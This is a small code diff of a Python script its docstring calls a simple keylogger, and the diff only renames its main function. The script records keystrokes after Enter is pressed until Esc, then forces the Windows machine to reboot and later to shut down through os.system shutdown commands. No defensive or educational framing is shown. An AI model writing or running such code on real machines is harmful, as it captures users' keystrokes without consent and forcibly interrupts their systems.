@@ -1,8 +1,9 @@
+""" Just a simple keylogger implementation """
 import os
 import keyboard
 
 
-def keylog():
+def keylogger():
     keyboard.wait('enter')
     recording = keyboard.record(until='esc')
     os.system('shutdown /r /t 1')
@@ -11,4 +12,4 @@ def keylog():
     os.system('shutdown /s /t 1')
 
 
-keylog()
+keylogger()
